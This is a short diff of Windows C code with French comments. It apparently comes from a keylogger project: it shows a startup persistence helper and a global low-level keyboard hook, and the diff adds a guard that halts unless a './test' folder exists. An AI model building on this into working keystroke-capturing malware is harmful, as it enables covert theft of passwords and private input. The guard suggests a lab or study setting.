@@ -25,6 +25,16 @@ void add_to_startup(const char *exe_path);
 // Fonction principale
 int main() {
 
+    DWORD dwAttrib = GetFileAttributes(directory);
+
+    /**
+        GARDE FOU
+     */
+    if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
+        fprintf(stderr, "Le dossier './test' n'existe pas.\n");
+        return 1;  // Arrêter le programme si le dossier n'existe pas
+    }
+
     // Initialise le hook clavier
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (!hKeyboardHook) {
